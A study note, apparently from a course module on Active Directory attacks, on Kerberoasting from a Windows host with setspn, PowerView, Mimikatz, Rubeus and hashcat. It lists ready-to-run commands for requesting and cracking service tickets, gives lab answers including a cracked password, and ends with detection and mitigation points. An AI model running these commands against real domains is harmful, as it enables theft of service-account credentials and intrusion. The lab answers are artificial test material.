# NOTE template — hands-on section (has commands)

---

## ID
531

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 18 — Kerberoasting from Windows

## Description
Perform Kerberoasting from a domain-joined Windows host using setspn.exe, PowerView, Mimikatz, and Rubeus to enumerate SPNs, request TGS tickets, and crack service account passwords offline.

## Tags
kerberoasting, spn, rubeus, powerview, mimikatz, windows

## Commands
- setspn.exe -Q */*
- Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
- mimikatz # kerberos::list /export
- Import-Module .\PowerView.ps1; Get-DomainUser * -SPN | select samaccountname
- Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
- Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
- .\Rubeus.exe kerberoast /stats
- .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
- .\Rubeus.exe kerberoast /user:<USER> /nowrap
- .\Rubeus.exe kerberoast /tgtdeleg /nowrap
- hashcat -m 13100 <TGS_FILE> <WORDLIST> --force

## What This Section Covers
Kerberoasting from a Windows host using three approaches: a semi-manual method (setspn + PowerShell + Mimikatz), PowerView for direct Hashcat-format extraction, and Rubeus for fast automated roasting with filtering options. Also covers encryption type considerations (RC4 vs AES), the `/tgtdeleg` downgrade trick, and detection/mitigation strategies.

## Methodology
1. **Semi-manual method:** Enumerate SPNs with `setspn.exe -Q */*`, request tickets into memory with `KerberosRequestorSecurityToken`, extract with `mimikatz # kerberos::list /export`, convert `.kirbi` to crackable format with `kirbi2john.py`, then crack with Hashcat.
2. **PowerView method:** `Import-Module .\PowerView.ps1`, enumerate with `Get-DomainUser * -SPN`, extract tickets in Hashcat format with `Get-DomainSPNTicket -Format Hashcat`, export all to CSV for bulk cracking.
3. **Rubeus method (fastest):** Run `.\Rubeus.exe kerberoast /stats` to survey targets, then `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` to target high-value accounts. Use `/tgtdeleg` to force RC4 downgrade on pre-2019 DCs.
4. Crack tickets offline with `hashcat -m 13100` (RC4/type 23) or `hashcat -m 19700` (AES-256/type 18).
5. Validate cracked creds with `crackmapexec` or direct access (RDP, WinRM, MSSQL, etc.).

## Multi-step Workflow (Rubeus — recommended)
```
# 1. Survey kerberoastable accounts
.\Rubeus.exe kerberoast /stats

# 2. Target high-value accounts (admincount=1)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# 3. Or target a specific user
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap

# 4. Force RC4 downgrade (only works on pre-Server 2019 DCs)
.\Rubeus.exe kerberoast /tgtdeleg /nowrap

# 5. Crack offline
hashcat -m 13100 tgs_hash /usr/share/wordlists/rockyou.txt --force
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: What is the name of the service account with SPN 'vmware/inlanefreight.local'? | `svc_vmwaresso` | `setspn.exe -Q */*` or Rubeus output — account name in the TGS hash |
| Q2: Crack the password for this account. | `Virtual01` | `Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap` → `hashcat -m 13100` with rockyou.txt |

## Key Takeaways
- Rubeus with `/nowrap` is the fastest Windows method — outputs hashes on a single line ready for Hashcat, no post-processing needed.
- `/stats` flag gives a quick overview: total kerberoastable users, encryption types supported, and password age — use this to prioritize targets before pulling tickets.
- `/ldapfilter:'admincount=1'` restricts to accounts that are or were in privileged groups — these are the highest-value targets.
- `/tgtdeleg` forces RC4 ticket requests even for AES-enabled accounts, but only works against pre-Server 2019 DCs. On 2019+ DCs, you get AES-256 regardless.
- RC4 (mode 13100) cracks ~70x faster than AES-256 (mode 19700) — same password took 4 seconds vs 4.5 minutes on a CPU.
- `msDS-SupportedEncryptionTypes` attribute: 0 = RC4 default, 24 = AES 128/256 only. Check with `Get-DomainUser <user> -Properties msds-supportedencryptiontypes`.
- Detection: Event ID 4769 (Kerberos service ticket requested) — a burst of these from one account signals automated Kerberoasting.
- Mitigation: use MSA/gMSA for service accounts (auto-rotating complex passwords), audit for RC4-only ticket requests, avoid putting service accounts in Domain Admins.

## Gotchas
- The semi-manual Mimikatz method outputs base64 with line wraps — you must `tr -d \\n` before decoding, or use `base64 /out:true` in Mimikatz first.
- `kirbi2john.py` output needs a `sed` fix to add the `$23$*` format marker before Hashcat will accept it. Rubeus/PowerView skip this hassle entirely.
- On Server 2019 DCs, `/tgtdeleg` does NOT work — you'll always get AES-256 tickets for AES-enabled accounts, which take significantly longer to crack.
- PowerView's `Export-Csv` wraps hashes in quotes — strip them before feeding to Hashcat.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[17-kerberoasting-linux]] | [[19-acl-abuse-primer]] →
<!-- AUTO-LINKS-END -->
